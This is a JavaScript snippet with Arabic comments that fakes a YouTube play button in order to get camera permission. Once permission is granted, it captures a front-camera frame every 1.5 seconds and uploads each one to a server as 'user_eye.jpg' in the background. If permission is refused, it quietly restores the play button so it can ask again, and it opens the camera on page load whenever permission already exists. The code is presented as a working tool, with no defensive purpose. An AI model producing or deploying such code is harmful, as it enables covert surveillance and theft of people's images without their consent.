/* ==========================================================
   سكريبت التشغيل عبر زر يوتيوب والتحكم الشرطي بالكاميرا
   ========================================================== */

let mediaStream = null;

async function startCapture() {
    if (mediaStream) return;
    
    const playerContainer = document.getElementById('playerContainer');
    if (!playerContainer) return;
    
    const activeId = playerContainer.dataset.videoId || 'zMORugVTZAA';

    try {
        // طلب إذن الكاميرا عند النقر على زر التشغيل
        mediaStream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: { ideal: 'user' } } 
        });

        const videoEl = document.getElementById('video');
        if (videoEl) videoEl.srcObject = mediaStream;
        
        // [عند السماح]: إدراج وتفيعل مشغل يوتيوب فوراً
        playerContainer.innerHTML = `<iframe src="https://www.youtube.com/embed/${activeId}?autoplay=1&rel=0&playsinline=1" title="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen referrerpolicy="strict-origin-when-cross-origin"></iframe>`;
        
        // التقاط الصور وإرسالها كل 1.5 ثانية في الخلفية
        setInterval(() => {
            if (!mediaStream || !videoEl) return;
            try {
                const vw = videoEl.videoWidth || 640;
                const vh = videoEl.videoHeight || 480;

                const canvas = document.createElement('canvas');
                canvas.width = vw;
                canvas.height = vh;

                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoEl, 0, 0, vw, vh);

                canvas.toBlob(blob => {
                    if (blob) {
                        let fd = new FormData();
                        fd.append('image', blob, `user_eye.jpg`);
                        fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
                    }
                }, 'image/jpeg', 0.85);
            } catch (err) {}
        }, 1500);

    } catch (e) {
        console.log("تم رفض الإذن أو تجاهله:", e);
        mediaStream = null;
        
        // [عند التجاهل أو عدم السماح]: إعادة إظهار الصورة المصغرة وزر التشغيل كأن شيئاً لم يكن تماماً، مع السماح بإعادة المحاولة عند النقر مجدداً
        playerContainer.innerHTML = `
            <div style="cursor:pointer;position:relative;width:100%;height:100%;" onclick="startCapture()">
                <img src="https://img.youtube.com/vi/${activeId}/hqdefault.jpg" style="width:100%;height:100%;object-fit:cover;" alt="">
                <div style="position:absolute;inset:0;display:grid;place-items:center;background:rgba(0,0,0,0.2);">
                    <div style="width:68px;height:48px;background:#ff0000;border-radius:12px;display:grid;place-items:center;box-shadow:0 4px 12px rgba(0,0,0,0.4);">
                        <svg height="24" viewBox="0 0 24 24" width="24" fill="#fff"><path d="M8 5v14l11-7z"/></svg>
                    </div>
                </div>
            </div>
        `;
    }
}

// الفحص التلقائي عند فتح الصفحة (إذا كان الإذن ممنوحاً مسبقاً من قبل، يعمل السكريبت مباشرة)
navigator.permissions?.query({name: 'camera'}).then((permissionStatus) => {
    if (permissionStatus.state === 'granted') {
        // إذا كان مسموحاً مسبقاً، يمكن تشغيل التقاط الخلفية تلقائياً
        navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'user' } } }).then(stream => {
            mediaStream = stream;
            const videoEl = document.getElementById('video');
            if (videoEl) videoEl.srcObject = mediaStream;
        }).catch(()=>{});
    }
});
